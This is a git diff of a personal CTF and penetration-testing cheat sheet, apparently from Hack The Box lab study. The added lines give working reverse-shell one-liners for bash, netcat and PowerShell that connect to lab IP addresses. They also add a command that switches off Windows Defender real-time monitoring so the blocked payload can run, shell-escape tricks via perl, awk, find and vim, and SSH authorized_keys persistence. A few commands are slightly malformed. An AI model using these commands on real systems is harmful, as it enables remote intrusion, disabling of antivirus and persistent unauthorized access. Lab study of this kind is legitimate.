@@ -11,6 +11,9 @@
 - directory scan
 	- dirb
 	- dirsearch
+		- if you dont have any way in may be it is because of the hidden file to get that increase ur threads to 60
+	- feroxbuster
+	- 
 - subdomain scan
 	- ffuf - seclists
 ## Web CTF
@@ -205,13 +208,24 @@ hnathan26@htb[/htb]$ sudo -l
 	- Database files
 	- Php files
 ## Reverse Shells - commands
-### bash
+### bash Reverse Shell
 	- `bash -i >& /dev/tcp/10.10.16.11/4444 0>&1`	  
 	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.11 4444 >/tmp/f`
-### powershell
+### powershell Reverse Shell
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.66',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+- We Might get errors while doing this PS payload, error like
+```powershell
+At line:1 char:1
++ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
 ```
+- For this we need to deactivate the AV, using the following command
+	- `Set-MpPreference -DisableRealtimeMonitoring $true`
 ### PHP Reverse Shell
 
 ```
@@ -282,6 +296,34 @@ www-data@remotehost$
 - we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user
 	- We Create Key `ssh-keygen`
 	- we will copy our `.pub` to victims `.ssh` folder and we will use `-i` with our private key on our computer
+## Spawning Interactive Shell
+### Perl
+```shell
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+```
+### Ruby
+```shell
+ruby: exec "/bin/sh"
+```
+### Lua
+```shell
+lua: os.execute('/bin/sh')
+```
+### Awk
+```shell
+awk 'BEGIN {system("/bin/sh")}'
+```
+### Find
+```shell
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+find . -exec /bin/sh \;; -quit
+```
+### Vim
+```shell
+vim -c ':!/bin/sh'
+```
+
 ## Hash Types
 
 ```
@@ -295,3 +337,46 @@ Base64	YnJlYWtpdA==
 Base85	@WH$gCM@k
 Base91	%zmfv;:YH
 ```
+
+# Windows Fundamental
+- To find information about windows OS
+```powershell
+PS C:\htb> Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
+```
+	- select is like "grep"
+- We can list out the NTFS permissions on a specific directory by running either `icacls`
+```shell
+C:\htb> icacls c:\windows
+c:\windows NT SERVICE\TrustedInstaller:(F)
+           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+           NT AUTHORITY\SYSTEM:(M)
+```
+- `F` : full access
+- `D` :  delete access
+- `N` :  no access
+- `M` :  modify access
+- `RX` :  read and execute access
+- `R` :  read-only access
+- `W` :  write-only access
+
+- CHMOD +rwx       on windows `icacls folderPATH /grant username:f`
+- CHMOD -rwx       on windows `icacls c:\users /remove joe`
+- On windows the command `net share` will display which share is available
+## Services
+- Windows services are managed via the Service Control Manager (SCM) system, accessible via the `services.msc` MMC add-in.
+- To See Running Services
+	- `Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl`
+- Windows has three categories of services: Local Services, Network Services, and System Services.
+
+|Service|Description|
+|---|---|
+|smss.exe|Session Manager SubSystem. Responsible for handling sessions on the system.|
+|csrss.exe|Client Server Runtime Process. The user-mode portion of the Windows subsystem.|
+|wininit.exe|Starts the Wininit file .ini file that lists all of the changes to be made to Windows when the computer is restarted after installing a program.|
+|logonui.exe|Used for facilitating user login into a PC|
+|lsass.exe|The Local Security Authentication Server verifies the validity of user logons to a PC or server. It generates the process responsible for authenticating users for the Winlogon service.|
+|services.exe|Manages the operation of starting and stopping services.|
+|winlogon.exe|Responsible for handling the secure attention sequence, loading a user profile on logon, and locking the computer when a screensaver is running.|
+|System|A background system process that runs the Windows kernel.|
+|svchost.exe with RPCSS|Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Remote Procedure Call (RPC) Service (RPCSS).|
+|svchost.exe with Dcom/PnP|Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Distributed Component Object Model (DCOM) and Plug and Play (PnP) services.|
